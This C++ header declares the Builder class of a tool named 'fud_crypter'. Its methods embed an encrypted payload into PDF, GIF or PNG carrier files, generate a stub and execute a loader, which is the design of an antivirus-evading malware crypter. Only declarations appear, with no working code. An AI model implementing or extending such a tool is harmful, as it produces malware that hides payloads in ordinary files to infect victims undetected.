#pragma once
#include "fud_crypter/config.hpp"
#include "fud_crypter/logging/logger.hpp"
#include <vector>
#include <string>
#include <memory>

namespace fud_crypter {

    class Builder {
    public:
        explicit Builder(const BuilderConfig& config);
        bool build();

    private:
        bool embed_pdf(const std::vector<uint8_t>& payload, const std::vector<uint8_t>& key);
        bool embed_gif(const std::vector<uint8_t>& payload, const std::vector<uint8_t>& key);
        bool embed_png(const std::vector<uint8_t>& payload, const std::vector<uint8_t>& key);
        bool generate_stub(const std::vector<uint8_t>& key);
        bool execute_loader(const std::string& carrier, const std::string& key);

        std::vector<uint8_t> read_file(const std::string& path);
        bool write_file(const std::string& path, const std::vector<uint8_t>& data);
        std::vector<uint8_t> generate_random_key(size_t size = 32);

        BuilderConfig config_;
        std::shared_ptr<Logger> logger_;
    };

} // namespace fud_crypter
